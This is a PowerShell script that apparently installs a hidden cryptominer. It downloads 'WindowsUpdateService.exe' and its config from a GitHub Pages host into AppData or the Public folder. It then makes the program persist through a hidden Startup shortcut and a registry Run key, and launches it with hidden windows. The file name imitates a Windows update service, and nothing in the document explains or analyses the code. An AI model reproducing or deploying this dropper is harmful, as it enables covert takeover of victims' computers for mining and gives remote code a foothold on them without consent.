$baseUrl = "https://outof-ctrl.github.io/Outof-repo"
$appdataPath = "$env:APPDATA\WinUS"
$publicPath = "C:\Users\Public\WinUS"

function Run-Miner {
    param ([string]$path)
    $exePath = "$path\WindowsUpdateService.exe"
    Start-Process -FilePath $exePath -ArgumentList "--config $path\config.json" -WindowStyle Hidden
}

if (Test-Path -Path $env:APPDATA) {
    if (!(Test-Path -Path $appdataPath)) {
        New-Item -ItemType Directory -Path $appdataPath
    }
    Invoke-WebRequest -Uri "$baseUrl/WindowsUpdateService.exe" -OutFile "$appdataPath\WindowsUpdateService.exe"
    Invoke-WebRequest -Uri "$baseUrl/config.json" -OutFile "$appdataPath\config.json"
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    if (Test-Path -Path $startupFolder) {
        $shortcutPath = "$startupFolder\WindowsUpdateService.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -Command `"Start-Process '$appdataPath\WindowsUpdateService.exe' -ArgumentList '--config $appdataPath\config.json' -WindowStyle Hidden`""
        $shortcut.Save()
        Run-Miner -path $appdataPath
        exit
    }
}

if (!(Test-Path -Path $publicPath)) {
    New-Item -ItemType Directory -Path $publicPath
}

Invoke-WebRequest -Uri "$baseUrl/WindowsUpdateService.exe" -OutFile "$publicPath\WindowsUpdateService.exe"
Invoke-WebRequest -Uri "$baseUrl/config.json" -OutFile "$publicPath\config.json"

try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -Value "$publicPath\WindowsUpdateService.exe --config $publicPath\config.json"
    Run-Miner -path $publicPath
    exit
} catch {}

Write-Output "Install failed"
